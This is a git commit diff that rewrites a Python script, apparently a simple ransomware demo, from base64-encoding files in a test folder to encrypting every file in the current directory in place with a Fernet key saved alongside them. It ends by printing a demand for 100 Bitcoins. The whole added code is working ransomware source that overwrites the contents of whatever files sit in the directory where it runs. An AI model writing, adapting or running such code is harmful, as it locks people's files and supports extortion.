7e4e799972c994cbef988af2e680f49ee0228e2f
SaurabhSingh773 <164193331+SaurabhSingh773@users.noreply.github.com>
2025-05-14 22:31:41 +0530

    Update encryption.py

--- encryption.py
+++ encryption.py
@@ -1,22 +1,32 @@
+#!/usr/bin/env python3
+
 import os
-import base64
+from cryptography.fernet import Fernet
 
-# Directory containing the files to be "encrypted"
-directory = "/home/immortal/ransomware_test"
+# Let's find some files
+files = []
 
-# Function to encrypt a file using base64 encoding (for demonstration)
-def encrypt_file(file_path):
-    with open(file_path, "rb") as file:
-        file_data = file.read()
-    encrypted_data = base64.b64encode(file_data)
-    
-    with open(file_path, "wb") as file:
-        file.write(encrypted_data)
+# Loop through the files in the current directory
+for file in os.listdir():
+    if file == "rans.py" or file == "mykey.key" or file == "decrypt.py":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+print(files)
 
-# Encrypt the specific file (excluding encryption.py and decryption.py)
-for filename in os.listdir(directory):
-    file_path = os.path.join(directory, filename)
-    
-    if os.path.isfile(file_path) and filename not in ['decryption.py', 'encryption.py']:
-        encrypt_file(file_path)
-        print(f"Encrypted: {file_path}")
+# Generate a key for encryption
+key = Fernet.generate_key()
+
+# Save the key to a file
+with open("mykey.key", "wb") as mykey:
+    mykey.write(key)
+
+# Encrypt all the files found earlier
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
+
+print("You have been hacked!!! Send me 100 Bitcoins in 24 Hours")
